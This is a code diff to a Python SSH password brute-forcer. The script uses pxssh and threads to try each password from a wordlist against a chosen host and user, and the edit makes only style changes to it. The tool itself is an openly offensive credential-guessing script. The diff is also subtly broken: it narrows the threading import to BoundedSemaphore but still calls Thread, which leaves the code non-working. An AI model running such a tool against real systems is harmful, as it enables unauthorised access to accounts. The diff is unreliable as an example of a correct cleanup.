@@ -12,12 +12,14 @@ To Do:
 from pexpect import pxssh
 import argparse
 import time
-from threading import *
+from threading import BoundedSemaphore
+import sys
 
 maxConnections = 5
 connection_lock = BoundedSemaphore(value=maxConnections)
 Found = False
 Fails = 0
+
 
 def connect(host, user, password, release):
     global Found
@@ -39,6 +41,7 @@ def connect(host, user, password, release):
         if release:
             connection_lock.release()
 
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('--host',nargs='?', action="store", dest="host", help="The host to target for scanning.")
@@ -51,14 +54,14 @@ def main():
     passfile = args.passfile
     user = args.user
 
-    if host == None or passfile == None or user == None:
+    if host is None or passfile is None or user is None:
         parser.print_help()
 
     with open(passfile, 'r') as passList:
         for line in passList.readlines():
             if Found:
                 print('[+] Exiting: Password Found')
-                sys.exit(0)
+                sys.exit()
             if Fails > 5:
                 print('[!] Exiting: Too many socket timeouts.')
                 sys.exit(1)
@@ -67,6 +70,7 @@ def main():
             print('[-] Testing: {}'.format(password))
             t = Thread(target=connect, args=(host, user, password, True))
             child = t.start()
+
 
 if __name__ == '__main__':
     main()
